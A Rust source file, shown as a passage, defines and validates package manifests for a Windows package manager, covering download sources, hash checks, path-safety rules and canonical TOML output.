//! Package manifest types and validation (spec §4).
//!
//! One TOML file per package version. Declarative only — there is deliberately
//! no script field, and the grammar cannot express one.

use std::collections::BTreeMap;
use std::str::FromStr;

use serde::{Deserialize, Serialize};

/// Package kind.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Deserialize, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Kind {
    App,
    Mcp,
    Skill,
}

impl Kind {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::App => "app",
            Self::Mcp => "mcp",
            Self::Skill => "skill",
        }
    }
}

/// A package identity. Bare names remain app references for compatibility.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub struct PackageRef {
    pub kind: Kind,
    pub name: String,
}

impl PackageRef {
    pub fn parse(value: &str) -> Result<Self, PackageRefError> {
        value.parse()
    }
}

impl FromStr for PackageRef {
    type Err = PackageRefError;

    fn from_str(value: &str) -> Result<Self, Self::Err> {
        let (kind, name) = match value.split_once('/') {
            Some(("app", name)) => (Kind::App, name),
            Some(("mcp", name)) => (Kind::Mcp, name),
            Some(("skill", name)) => (Kind::Skill, name),
            Some((kind, _)) => return Err(PackageRefError::Kind(kind.to_string())),
            None => (Kind::App, value),
        };
        validate_name(name).map_err(|_| PackageRefError::Name(name.to_string()))?;
        Ok(Self {
            kind,
            name: name.to_string(),
        })
    }
}

/// Errors from parsing a package reference.
#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum PackageRefError {
    #[error("unknown package kind '{0}': expected app, mcp, or skill")]
    Kind(String),
    #[error("invalid package name '{0}': must be lowercase alphanumeric and dashes only")]
    Name(String),
}

/// How a source payload is handled.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Deserialize, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum SourceKind {
    /// Regular archive (zip/7z/tar.gz) — extracted directly.
    #[default]
    Archive,
    /// Installer binary (.exe/.msi) — extracted with 7-Zip (no-execute),
    /// never run. Hash-verified before extraction.
    InstallerArchive,
    /// A single bare file that is NOT a container (`jq.exe`, `yt-dlp.exe`).
    /// Hash-verified exactly like an archive, then copied into the version dir
    /// under [`Manifest::binary_file_name`] instead of being extracted.
    Binary,
}

impl SourceKind {
    fn is_archive(&self) -> bool {
        *self == Self::Archive
    }

    /// The wire name, identical to the serde rename.
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Archive => "archive",
            Self::InstallerArchive => "installer-archive",
            Self::Binary => "binary",
        }
    }
}

/// A per-architecture download source.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct Source {
    pub url: String,
    #[serde(default)]
    pub sha256: Option<String>,
    #[serde(default)]
    pub sha512: Option<String>,
    /// Additional archives extracted into subdirectories of the version dir.
    #[serde(default)]
    pub extra: Vec<ExtraSource>,
    /// How the payload is handled (default: archive).
    #[serde(default, skip_serializing_if = "SourceKind::is_archive")]
    pub kind: SourceKind,
    /// The wrapper dir to strip from THIS arch's archive, overriding the
    /// top-level [`Manifest::extract_dir`]. Absent = use the top-level one, so
    /// every existing manifest keeps its exact meaning.
    ///
    /// It exists because vendors name the wrapper per architecture
    /// (`zig-x86_64-windows-0.16.0` vs `zig-aarch64-windows-0.16.0`) while
    /// `extract_dir` was a single top-level field. Resolved by
    /// [`Manifest::extract_dir_for`].
    #[serde(default)]
    pub extract_dir: Option<String>,
}

impl Source {
    /// The primary hash value (sha256 or sha512, whichever is present).
    /// Panics if neither is set — unreachable after validation.
    pub fn hash(&self) -> &str {
        self.sha256
            .as_deref()
            .or(self.sha512.as_deref())
            .expect("validated: exactly one hash is present")
    }

    /// True when the primary hash is sha512 (false = sha256).
    pub fn is_sha512(&self) -> bool {
        self.sha512.is_some()
    }
}

/// An extra download extracted into a subdirectory of the version dir.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct ExtraSource {
    pub url: String,
    pub sha256: String,
    pub extract_to: String,
}

/// Sources keyed by architecture. At least one arch must be present.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize, Serialize, Default)]
#[serde(deny_unknown_fields)]
pub struct Sources {
    pub any: Option<Source>,
    pub x64: Option<Source>,
    pub arm64: Option<Source>,
}

impl Sources {
    /// The block for one architecture. `any` is skill-only and never selected
    /// by architecture.
    pub fn for_arch(&self, arch: Arch) -> Option<&Source> {
        match arch {
            Arch::X64 => self.x64.as_ref(),
            Arch::Arm64 => self.arm64.as_ref(),
        }
    }
}

/// A host CPU architecture — which `[source.<arch>]` block an install prefers.
///
/// Always a **runtime** value, never `cfg!(target_arch)`: the released `voli.exe`
/// is x86_64-only, so on an ARM64 Windows box it runs under the x64 emulator and
/// the compile-time arch reports x86_64 — precisely the case arch selection
/// exists to handle. See `crate::install::host_arch`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Arch {
    X64,
    Arm64,
}

impl Arch {
    /// The wire name, identical to the `[source.<arch>]` table name.
    pub fn as_str(self) -> &'static str {
        match self {
            Self::X64 => "x64",
            Self::Arm64 => "arm64",
        }
    }

    /// The other architecture — the only fallback candidate there is.
    pub fn other(self) -> Self {
        match self {
            Self::X64 => Self::Arm64,
            Self::Arm64 => Self::X64,
        }
    }
}

/// Why an install used a source that is not the host's own architecture.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ArchFallback {
    /// The manifest has no `[source.<host arch>]` block at all.
    Missing,
    /// The host's block exists, but the top-level `extract_dir` next to it was
    /// authored against the other arch's archive and this block carries no
    /// override — stripping it could fail after a full download.
    ExtractDir,
}

impl ArchFallback {
    /// Why the host's own architecture was not used, for the install output.
    pub fn reason(self) -> &'static str {
        match self {
            Self::Missing => "no source for this machine's architecture",
            Self::ExtractDir => "the native source has no extract_dir of its own",
        }
    }
}

/// The `[source.<arch>]` block an install picked, and why.
#[derive(Debug, Clone, Copy)]
pub struct SelectedSource<'a> {
    pub source: &'a Source,
    /// The arch of the block actually chosen — not necessarily the host's.
    pub arch: Arch,
    /// `None` when `arch` IS the host's architecture.
    pub fallback: Option<ArchFallback>,
}

/// A shim to create. Either a bare relative path (`"rg.exe"`) or the table form
/// `{ name = "t2", path = "tool2.exe", args = "--flag" }`.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize, Serialize)]
#[serde(untagged)]
pub enum Bin {
    Path(String),
    Table {
        name: String,
        path: String,
        #[serde(default)]
        args: Option<String>,
    },
}

/// A Start Menu shortcut. Either a bare relative exe path (`"myapp.exe"`) or
/// the table form `{ target = "myapp.exe", name = "My App" }`.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize, Serialize)]
#[serde(untagged)]
pub enum Shortcut {
    Path(String),
    Table { target: String, name: String },
}

impl Shortcut {
    /// The archive-relative path this shortcut points at.
    pub fn target(&self) -> &str {
        match self {
            Shortcut::Path(p) => p,
            Shortcut::Table { target, .. } => target,
        }
    }

    /// The display name for the `.lnk` file (without extension).
    pub fn link_name(&self) -> String {
        match self {
            Shortcut::Table { name, .. } => name.clone(),
            Shortcut::Path(p) => file_stem_any_sep(p),
        }
    }
}

/// The final path segment of `value`, without its extension, treating BOTH `/`
/// and `\` as separators on every platform.
///
/// `Path::file_stem` cannot be used here. It only treats `\` as a separator on
/// Windows, so `bin\rg.exe` yields `rg` on Windows and `bin\rg` on Linux — and
/// `voli-index-tool`, which validates and compiles the whole registry, builds on
/// Linux. That divergence made 215 manifests pass locally and fail in CI.
fn file_stem_any_sep(value: &str) -> String {
    let base = value.rsplit(['/', '\\']).next().unwrap_or(value);
    match base.rsplit_once('.') {
        // A leading dot is part of the name (`.gitignore`), not an extension.
        Some((stem, _)) if !stem.is_empty() => stem.to_string(),
        _ => base.to_string(),
    }
}

/// A file to write into the version dir during install (declarative, no code).
#[derive(Debug, Clone, PartialEq, Eq, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct WriteFile {
    pub path: String,
    pub content: String,
}

impl Bin {
    /// The archive-relative path this bin points at.
    pub fn path(&self) -> &str {
        match self {
            Bin::Path(p) => p,
            Bin::Table { path, .. } => path,
        }
    }

    /// The base name for the generated `<name>.shim` / `<name>.exe` pair.
    /// Table form uses its explicit `name`; bare paths use the file stem.
    pub fn shim_name(&self) -> String {
        match self {
            Bin::Table { name, .. } => name.clone(),
            Bin::Path(p) => file_stem_any_sep(p),
        }
    }

    /// Optional args to prepend, written as line 2 of the `.shim` file.
    pub fn args(&self) -> Option<&str> {
        match self {
            Bin::Table { args, .. } => args.as_deref(),
            Bin::Path(_) => None,
        }
    }
}

/// The full package manifest.
#[derive(Debug, Clone, PartialEq, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct Manifest {
    pub name: String,
    pub version: String,
    #[serde(default)]
    pub description: Option<String>,
    #[serde(default)]
    pub homepage: Option<String>,
    #[serde(default)]
    pub icon: Option<String>,
    #[serde(default)]
    pub license: Option<String>,
    pub kind: Kind,

    /// Former names this package answers to, so a rename does not strand the
    /// people who installed it under the old one. Resolution is one hop and
    /// never transitive: an alias points at a real package or the index build
    /// rejects it.
    #[serde(default)]
    pub aliases: Vec<String>,

    #[serde(default)]
    pub source: Sources,

    #[serde(default)]
    pub extract_dir: Option<String>,
    /// The name a `kind = "binary"` payload takes inside the version dir
    /// (default: the URL's last path segment). Top-level, not per-source, for
    /// the same reason `bin` is: one `bin = ["jq.exe"]` has to find the file
    /// whichever arch it came from.
    #[serde(default)]
    pub file_name: Option<String>,
    #[serde(default)]
    pub bin: Vec<Bin>,

    #[serde(default)]
    pub env: BTreeMap<String, String>,
    #[serde(default)]
    pub depends: BTreeMap<String, String>,

    /// CI-only metadata (checkver / url_template). Captured but not interpreted
    /// by the client.
    #[serde(default)]
    pub autoupdate: Option<toml::Value>,

    #[serde(default)]
    pub persist: Vec<String>,
    #[serde(default)]
    pub gui: Option<bool>,

    /// Start Menu shortcuts to create (spec §4).
    #[serde(default)]
    pub shortcuts: Vec<Shortcut>,
    /// Files to write into the version dir after extraction.
    #[serde(default)]
    pub write_file: Vec<WriteFile>,
}

/// Errors from parsing or validating a manifest.
#[derive(Debug, thiserror::Error)]
pub enum ManifestError {
    #[error("invalid TOML: {0}")]
    Toml(#[from] toml::de::Error),

    #[error("invalid package name '{0}': must be lowercase alphanumeric and dashes only")]
    Name(String),

    #[error("package '{0}' lists itself as an alias")]
    SelfAlias(String),

    #[error("alias '{0}' is listed twice")]
    DuplicateAlias(String),

    #[error("no source: at least one of [source.x64] or [source.arm64] is required")]
    NoSource,

    #[error("invalid skill source: exactly one [source.any] archive is required")]
    SkillSource,

    #[error("invalid skill name '{0}': expected the Agent Skills name format")]
    SkillName(String),

    #[error("invalid skill archive URL '{0}': expected .zip, .tar.gz, or .tgz")]
    SkillArchiveUrl(String),

    #[error("[source.any] is only allowed for skill packages")]
    UniversalSource,

    #[error("source for {arch}: exactly one of sha256 or sha512 is required")]
    HashRequired { arch: &'static str },

    #[error("invalid {alg} for {arch}: must be {len} hex characters")]
    BadHash {
        alg: &'static str,
        arch: &'static str,
        len: usize,
    },

    #[error("invalid {field} path '{path}': must be relative (no absolute paths, no '..')")]
    RelativePath { field: &'static str, path: String },

    #[error("invalid {field} '{value}': must be a single plain file name")]
    Component { field: &'static str, value: String },

    #[error("invalid env value for '{key}': only the {{dir}} template variable is allowed")]
    EnvTemplate { key: String },

    #[error("invalid icon URL '{0}': must be an HTTPS URL")]
    IconUrl(String),

    #[error("field '{0}' is not allowed for skill packages")]
    SkillField(&'static str),

    #[error("field '{0}' is meaningless with a source of kind \"binary\" (nothing is extracted)")]
    BinaryField(&'static str),

    #[error("'file_name' names a downloaded file and requires a source of kind \"binary\"")]
    FileNameWithoutBinary,
}

impl Manifest {
    /// The on-disk name a `kind = "binary"` payload takes inside the version
    /// dir: `file_name` when set, else the URL's last path segment.
    ///
    /// The URL default is only ever right by accident (`jq-windows-amd64.exe`
    /// is not what anyone wants on PATH), which is why `file_name` exists — but
    /// it keeps a manifest whose URL already ends in the right name free of
    /// boilerplate. The `#/name.ext` rename fragment wins when present, the same
    /// convention [`crate::fetch`] uses to name the cached download; a query
    /// string or any other fragment is dropped, never written to disk.
    ///
    /// Validated with [`check_component`], so `bin = ["jq.exe"]` finds it.
    pub fn binary_file_name<'a>(&'a self, source: &'a Source) -> &'a str {
        match &self.file_name {
            Some(name) => name,
            None => url_file_name(&source.url),
        }
    }

    /// The wrapper dir to strip after extracting `source`: that source's own
    /// `extract_dir` when it has one, else the top-level one, else none.
    pub fn extract_dir_for<'a>(&'a self, source: &'a Source) -> Option<&'a str> {
        source
            .extract_dir
            .as_deref()
            .or(self.extract_dir.as_deref())
    }

    /// Pick the `[source.<arch>]` block to install on `host`.
    ///
    /// The policy is deliberately conservative, so switching arm64 selection on
    /// requires **zero** manifest edits:
    ///
    /// * x64 host → `[source.x64]`.
    /// * arm64 host → `[source.arm64]` only when picking it is provably safe:
    ///   that block carries its own `extract_dir`, or there is no top-level
    ///   `extract_dir` to mis-strip. Otherwise `[source.x64]`, which works under
    ///   emulation.
    /// * either way, if the host's block is absent, the other arch is used and
    ///   the caller is told which and why via [`SelectedSource::fallback`].
    ///
    /// The asymmetry is the point. A top-level `extract_dir` in this registry was
    /// measured against the **x64** archive (the Scoop importer emitted the x64
    /// value; 83 of the 537 dual-arch manifests carry an arch token literally in
    /// the string, e.g. `zig-x86_64-windows-0.16.0`), so it is trustworthy for
    /// x64 and a guess for arm64. And a wrong `extract_dir` fails with
    /// `ExtractDirMissing` only AFTER the user has downloaded the whole archive —
    /// so a correct-but-emulated install beats a broken native one. Packages go
    /// native as manifests gain a per-arch `extract_dir`; nothing has to be fixed
    /// up front.
    ///
    /// Returns `None` only when neither arch is present — impossible for a
    /// validated non-skill manifest, and skills use `[source.any]` instead.
    pub fn select_source(&self, host: Arch) -> Option<SelectedSource<'_>> {
        let other = host.other();
        match (self.source.for_arch(host), self.source.for_arch(other)) {
            (None, None) => None,
            // No block for this machine: use what there is, and say so.
            (None, Some(source)) => Some(SelectedSource {
                source,
                arch: other,
                fallback: Some(ArchFallback::Missing),
            }),
            // Native block exists, but the only `extract_dir` around belongs to
            // the archive sitting next to it. Prefer the emulated build.
            //
            // Guarded on the other arch existing: in a single-arch manifest the
            // top-level `extract_dir` describes THAT arch's archive by
            // construction, so there is nothing to be conservative about.
            (Some(native), Some(emulated))
                if host == Arch::Arm64
                    && self.extract_dir.is_some()
                    && native.extract_dir.is_none() =>
            {
                Some(SelectedSource {
                    source: emulated,
                    arch: other,
                    fallback: Some(ArchFallback::ExtractDir),
                })
            }
            (Some(source), _) => Some(SelectedSource {
                source,
                arch: host,
                fallback: None,
            }),
        }
    }

    /// Parse and validate a manifest from a TOML string.
    pub fn from_toml_str(s: &str) -> Result<Manifest, ManifestError> {
        let m: Manifest = toml::from_str(s)?;
        m.validate()?;
        Ok(m)
    }

    /// The ONE canonical TOML form. Every emitter must go through this so the
    /// two manifest pipelines (`voli-index-tool bump` and the registry's
    /// `scoop-import`) cannot disagree on formatting — they used to, and it
    /// produced a merge conflict on 20 files in a single week.
    ///
    /// The form is the compact one the ~2,800 published manifests already use:
    /// empty collections omitted entirely, inline tables for `[autoupdate]`,
    /// arrays on one line however long, basic (double-quoted) strings.
    ///
    /// Two properties this must keep:
    /// - **Every top-level scalar is emitted before the first `[table]` header.**
    ///   TOML absorbs a stray scalar into the preceding table, which has been a
    ///   real parse bug here — hence one scalar block, no exceptions.
    /// - Re-parsing the output yields an equal `Manifest`, so it is safe to
    ///   normalize a file in place.
    ///
    /// Lines are `\n`; the registry stores LF and lets git translate.
    pub fn to_canonical_toml(&self) -> String {
        let mut o = String::new();

        // --- top-level scalars, all of them, before any [table] header ---
        o.push_str(&format!("name = {}\n", esc(&self.name)));
        o.push_str(&format!("version = {}\n", esc(&self.version)));
        for (field, value) in [
            ("description", &self.description),
            ("homepage", &self.homepage),
            ("icon", &self.icon),
            ("license", &self.license),
        ] {
            if let Some(value) = value {
                o.push_str(&format!("{field} = {}\n", esc(value)));
            }
        }
        o.push_str(&format!("kind = {}\n", esc(self.kind.as_str())));
        for (field, value) in [
            ("extract_dir", &self.extract_dir),
            ("file_name", &self.file_name),
        ] {
            if let Some(value) = value {
                o.push_str(&format!("{field} = {}\n", esc(value)));
            }
        }
        if let Some(gui) = self.gui {
            o.push_str(&format!("gui = {gui}\n"));
        }
        if !self.aliases.is_empty() {
            o.push_str(&format!(
                "aliases = {}\n",
                inline_array(&self.aliases, |a| esc(a))
            ));
        }
        if !self.bin.is_empty() {
            o.push_str(&format!("bin = {}\n", inline_array(&self.bin, bin_value)));
        }
        if !self.shortcuts.is_empty() {
            o.push_str(&format!(
                "shortcuts = {}\n",
                inline_array(&self.shortcuts, shortcut_value)
            ));
        }
        if !self.persist.is_empty() {
            o.push_str(&format!(
                "persist = {}\n",
                inline_array(&self.persist, |p| esc(p))
            ));
        }
        if !self.write_file.is_empty() {
            o.push_str(&format!(
                "write_file = {}\n",
                inline_array(&self.write_file, |w| inline_table(&[
                    ("path", esc(&w.path)),
                    ("content", esc(&w.content)),
                ]))
            ));
        }
        // An `autoupdate` that is not a table cannot be a [section], so it has to
        // be emitted here with the other scalars. No published manifest does
        // this; handling it is what makes the round-trip total rather than
        // "total for the shapes we happen to have seen".
        if let Some(value) = self.autoupdate.as_ref().filter(|v| !v.is_table()) {
            o.push_str(&format!("autoupdate = {}\n", inline_value(value)));
        }

        // --- tables ---
        for (arch, source) in [
            ("any", &self.source.any),
            ("x64", &self.source.x64),
            ("arm64", &self.source.arm64),
        ] {
            let Some(source) = source else { continue };
            o.push_str(&format!("\n[source.{arch}]\n"));
            o.push_str(&format!("url = {}\n", esc(&source.url)));
            // Both hashes at once is rejected by validation, but emit whatever is
            // there: a serializer that silently drops a field is worse.
            if let Some(h) = &source.sha256 {
                o.push_str(&format!("sha256 = {}\n", esc(h)));
            }
            if let Some(h) = &source.sha512 {
                o.push_str(&format!("sha512 = {}\n", esc(h)));
            }
            if !source.kind.is_archive() {
                o.push_str(&format!("kind = {}\n", esc(source.kind.as_str())));
            }
            if let Some(dir) = &source.extract_dir {
                o.push_str(&format!("extract_dir = {}\n", esc(dir)));
            }
            if !source.extra.is_empty() {
                o.push_str(&format!(
                    "extra = {}\n",
                    inline_array(&source.extra, |e| inline_table(&[
                        ("url", esc(&e.url)),
                        ("sha256", esc(&e.sha256)),
                        ("extract_to", esc(&e.extract_to)),
                    ]))
                ));
            }
        }
        for (header, map) in [("env", &self.env), ("depends", &self.depends)] {
            if map.is_empty() {
                continue;
            }
            o.push_str(&format!("\n[{header}]\n"));
            for (k, v) in map {
                o.push_str(&format!("{} = {}\n", bare_or_quoted_key(k), esc(v)));
            }
        }
        if let Some(table) = self.autoupdate.as_ref().and_then(toml::Value::as_table) {
            o.push_str("\n[autoupdate]\n");
            for (k, v) in ordered_pairs(table) {
                o.push_str(&format!(
                    "{} = {}\n",
                    bare_or_quoted_key(k),
                    inline_value(v)
                ));
            }
        }

        o
    }

    /// True when `text` is already in canonical form, ignoring two things that
    /// are not formatting:
    ///
    /// - **Line endings.** The registry stores LF; a Windows checkout has CRLF in
    ///   the working tree. That is git's choice, not a defect.
    /// - **Whole-line `#` comments.** A `Manifest` has nowhere to keep a comment,
    ///   so [`Self::to_canonical_toml`] cannot emit one — and the comments in the
    ///   registry are load-bearing (`p/python` says "[autoupdate] is deliberately
    ///   removed so CI can never add a version here"). Reporting those files as
    ///   drift would be telling a maintainer to delete the warning.
    ///
    /// A trailing comment on a value line is NOT stripped — that would need
    /// string-aware parsing — so such a file is reported as drift. Conservative
    /// in the safe direction, and no published manifest has one.
    pub fn is_canonical_toml(&self, text: &str) -> bool {
        let stripped: String = text
            .replace("\r\n", "\n")
            .lines()
            .filter(|line| !line.trim_start().starts_with('#'))
            .map(|line| format!("{line}\n"))
            .collect();
        stripped == self.to_canonical_toml()
    }

    fn validate(&self) -> Result<(), ManifestError> {
        validate_name(&self.name)?;
        // An alias is a name users type, so it lives under the same rules as a
        // real one. Aliasing yourself would make the package unreachable by its
        // own name the moment resolution prefers the alias table.
        for alias in &self.aliases {
            validate_name(alias)?;
            if *alias == self.name {
                return Err(ManifestError::SelfAlias(alias.clone()));
            }
        }
        if let Some(dup) = first_duplicate(&self.aliases) {
            return Err(ManifestError::DuplicateAlias(dup));
        }
        // The version becomes a directory name under apps\<name>\ (Paths::version_dir).
        check_component(&self.version, "version")?;

        if let Some(icon) = &self.icon {
            check_icon_url(icon)?;
        }

        if self.kind == Kind::Skill {
            validate_skill_name(&self.name)?;
            let Some(source) = &self.source.any else {
                return Err(ManifestError::SkillSource);
            };
            if self.source.x64.is_some() || self.source.arm64.is_some() {
                return Err(ManifestError::SkillSource);
            }
            check_source_hash(source, "any")?;
            check_extra_sources(source, "any")?;
            self.validate_skill()?;
            if !is_skill_archive_url(&source.url) {
                return Err(ManifestError::SkillArchiveUrl(source.url.clone()));
            }
        } else {
            if self.source.any.is_some() {
                return Err(ManifestError::UniversalSource);
            }
            if self.source.x64.is_none() && self.source.arm64.is_none() {
                return Err(ManifestError::NoSource);
            }
            if let Some(s) = &self.source.x64 {
                check_source_hash(s, "x64")?;
                check_extra_sources(s, "x64")?;
            }
            if let Some(s) = &self.source.arm64 {
                check_source_hash(s, "arm64")?;
                check_extra_sources(s, "arm64")?;
            }
        }

        // A binary source is one downloaded FILE, not a container, so there is
        // no wrapper to strip: `extract_dir` is rejected rather than ignored.
        // The destination name lands verbatim in the version dir, so it gets the
        // same single-component check as the version dir itself — a registry PR
        // is allowed to carry a hostile URL.
        let mut any_binary = false;
        for source in [&self.source.x64, &self.source.arm64].into_iter().flatten() {
            if source.kind == SourceKind::Binary {
                any_binary = true;
                check_component(self.binary_file_name(source), "source file name")?;
                if source.extract_dir.is_some() {
                    return Err(ManifestError::BinaryField("extract_dir"));
                }
            }
        }
        if any_binary {
            // Blunt on a mixed archive/binary pair across arches — but such a
            // manifest is pathological, and silently ignoring the field is worse.
            if self.extract_dir.is_some() {
                return Err(ManifestError::BinaryField("extract_dir"));
            }
        } else if self.file_name.is_some() {
            return Err(ManifestError::FileNameWithoutBinary);
        }

        // Both the top-level field and the per-arch override reach the
        // filesystem the same way (joined onto the staging dir), so they get the
        // SAME validator — one rule, no chance of the two drifting apart.
        let per_arch = [&self.source.any, &self.source.x64, &self.source.arm64]
            .into_iter()
            .flatten()
            .map(|s| &s.extract_dir);
        for dir in std::iter::once(&self.extract_dir).chain(per_arch).flatten() {
            check_relative(dir, "extract_dir")?;
        }

        // persist entries are joined onto BOTH apps\<name>\persist\ and the
        // version dir, and feed remove_dir_all / junction::create — the engine
        // has always assumed one flat directory name, so require it.
        for d in &self.persist {
            // Relative, not single-component: ~20 published packages persist a
            // nested path (`res\conf`, `AppData\Config`). Containment is what
            // matters here — `check_relative` rejects absolute paths, `..`, and
            // drive prefixes, which is the whole of the security property.
            check_relative(d, "persist")?;
        }

        for b in &self.bin {
            check_relative(b.path(), "bin")?;
            // shim_name() lands verbatim in shims\<name>.exe, which is next to
            // voli's own shim — a traversing name would overwrite it.
            check_component(&b.shim_name(), "bin name")?;
        }

        for (key, val) in &self.env {
            check_env_template(key, val)?;
        }

        for sc in &self.shortcuts {
            check_relative(sc.target(), "shortcut")?;
            // link_name() becomes <name>.lnk in the Start Menu folder.
            check_shortcut_name(&sc.link_name())?;
        }

        for wf in &self.write_file {
            check_relative(&wf.path, "write_file")?;
        }

        Ok(())
    }

    fn validate_skill(&self) -> Result<(), ManifestError> {
        let app_field = if self.extract_dir.is_some() {
            Some("extract_dir")
        } else if !self.bin.is_empty() {
            Some("bin")
        } else if !self.env.is_empty() {
            Some("env")
        } else if !self.depends.is_empty() {
            Some("depends")
        } else if !self.persist.is_empty() {
            Some("persist")
        } else if self.gui.is_some() {
            Some("gui")
        } else if !self.shortcuts.is_empty() {
            Some("shortcuts")
        } else if !self.write_file.is_empty() {
            Some("write_file")
        } else {
            None
        };
        if let Some(field) = app_field {
            return Err(ManifestError::SkillField(field));
        }
        let source = self
            .source
            .any
            .as_ref()
            .expect("validated: skill has a universal source");
        if source.kind != SourceKind::Archive {
            return Err(ManifestError::SkillField("source.kind"));
        }
        if source.extract_dir.is_some() {
            return Err(ManifestError::SkillField("source.extract_dir"));
        }
        if !source.extra.is_empty() {
            return Err(ManifestError::SkillField("source.extra"));
        }
        Ok(())
    }
}

/// The last path segment of a URL, with any query string or fragment stripped
/// and the `#/name.ext` rename fragment honoured.
///
/// String-based like everything else here: `Path::file_name` would treat `\` as
/// a separator only on Windows, and this runs in Linux CI too.
fn url_file_name(url: &str) -> &str {
    let path = match url.split_once("#/") {
        Some((_, fragment)) if !fragment.is_empty() => fragment,
        _ => url.split(['?', '#']).next().unwrap_or(url),
    };
    path.rsplit(['/', '\\']).next().unwrap_or(path)
}

fn check_icon_url(url: &str) -> Result<(), ManifestError> {
    let valid = url
        .strip_prefix("https://")
        .and_then(|rest| rest.split('/').next())
        .is_some_and(|host| !host.is_empty() && !host.chars().any(char::is_whitespace));
    if valid {
        Ok(())
    } else {
        Err(ManifestError::IconUrl(url.to_string()))
    }
}

/// First value that appears more than once, if any. Alias lists are a handful
/// of entries, so a scan beats building a set.
fn first_duplicate(values: &[String]) -> Option<String> {
    values
        .iter()
        .enumerate()
        .find(|(i, v)| values[..*i].contains(v))
        .map(|(_, v)| v.clone())
}

fn validate_name(name: &str) -> Result<(), ManifestError> {
    let ok = !name.is_empty()
        && name
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-');
    if ok {
        Ok(())
    } else {
        Err(ManifestError::Name(name.to_string()))
    }
}

fn validate_skill_name(name: &str) -> Result<(), ManifestError> {
    if name.len() <= 64 && !name.starts_with('-') && !name.ends_with('-') && !name.contains("--") {
        Ok(())
    } else {
        Err(ManifestError::SkillName(name.to_string()))
    }
}

fn is_skill_archive_url(url: &str) -> bool {
    let path = url
        .split_once("#/")
        .map(|(_, path)| path)
        .unwrap_or_else(|| url.split(['?', '#']).next().unwrap_or(url))
        .to_ascii_lowercase();
    path.ends_with(".zip") || path.ends_with(".tar.gz") || path.ends_with(".tgz")
}

fn check_source_hash(source: &Source, arch: &'static str) -> Result<(), ManifestError> {
    match (&source.sha256, &source.sha512) {
        (Some(h), None) => check_hex(h, 64, "sha256", arch),
        (None, Some(h)) => check_hex(h, 128, "sha512", arch),
        _ => Err(ManifestError::HashRequired { arch }),
    }
}

fn check_extra_sources(source: &Source, arch: &'static str) -> Result<(), ManifestError> {
    for ex in &source.extra {
        check_hex(&ex.sha256, 64, "sha256", arch)?;
        check_relative(&ex.extract_to, "extra extract_to")?;
    }
    Ok(())
}

fn check_hex(
    hash: &str,
    len: usize,
    alg: &'static str,
    arch: &'static str,
) -> Result<(), ManifestError> {
    if hash.len() == len && hash.chars().all(|c| c.is_ascii_hexdigit()) {
        Ok(())
    } else {
        Err(ManifestError::BadHash { alg, arch, len })
    }
}

/// A path field: relative, and every component a safe Windows file name.
///
/// Deliberately string-based rather than `Path`-based: `Path::components` is
/// platform-dependent (on Linux `a\b` is one component, and a mid-path `C:`
/// parses as a normal component whose later `PathBuf::push` silently discards
/// the base). Both separators are split here on every platform, and
/// [`safe_windows_component`] rejects `..`, drive prefixes, reserved device
/// names, and trailing dot/space.
fn check_relative(path: &str, field: &'static str) -> Result<(), ManifestError> {
    let ok = !path.is_empty()
        && !path.starts_with('/')
        && !path.starts_with('\\')
        && path
            .split(['/', '\\'])
            .all(|c| c.is_empty() || c == "." || component_ok(c));
    if ok {
        Ok(())
    } else {
        Err(ManifestError::RelativePath {
            field,
            path: path.to_string(),
        })
    }
}

/// A shortcut's display name. It may nest (`Vendor\App` is a Start Menu
/// subfolder, which ~5 published packages use), so containment is
/// [`check_relative`]'s job.
///
/// On top of that it rejects `$` and a backtick. Those are the two characters
/// PowerShell expands inside a double-quoted string, and this value reaches a
/// PowerShell script. [`crate::install`] no longer interpolates it — the script
/// is a constant and the paths arrive through the child's environment — so this
/// is defence in depth, deliberately: if that design is ever reverted to string
/// interpolation, validation still refuses the injection. No published manifest
/// uses either character; `(`, `)` and `!` are common (`Qalculate! (GTK)`) and
/// are inert without `$`, so they stay allowed.
fn check_shortcut_name(value: &str) -> Result<(), ManifestError> {
    check_relative(value, "shortcut name")?;
    if value.contains('$') || value.contains('`') {
        return Err(ManifestError::Component {
            field: "shortcut name",
            value: value.to_string(),
        });
    }
    Ok(())
}

/// A name field that becomes exactly ONE file or directory name on disk (the
/// version dir, a shim base name). Stricter than [`check_relative`]: no
/// separators at all, and none of the characters Windows forbids in a file name.
/// One path component, checked for everything except the separators themselves:
/// non-empty, bounded, no drive prefix / reserved device name / trailing dot or
/// space, and none of the characters Windows forbids in a file name. Shared by
/// [`check_relative`] (per component) and [`check_component`] (whole value), so
/// a rule can never apply to one and not the other.
fn component_ok(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 128
        && safe_windows_component(value)
        && !value
            .chars()
            .any(|c| c.is_control() || r#"<>:"|?*"#.contains(c))
}

fn check_component(value: &str, field: &'static str) -> Result<(), ManifestError> {
    let ok = component_ok(value) && !value.contains(['/', '\\']);
    if ok {
        Ok(())
    } else {
        Err(ManifestError::Component {
            field,
            value: value.to_string(),
        })
    }
}

/// True when `value` is safe to use as a single Windows path component.
///
/// Rejects `:` (drive prefixes — `PathBuf::push` of a drive-prefixed component
/// RESETS the whole path, so a mid-path `C:` escapes any join), a trailing dot
/// or space (Windows silently strips them, which defeats name comparisons), and
/// the reserved device names. Shared with the archive-entry validator in
/// `skill.rs`; lives here because `manifest` is the one module that builds on
/// non-Windows hosts too.
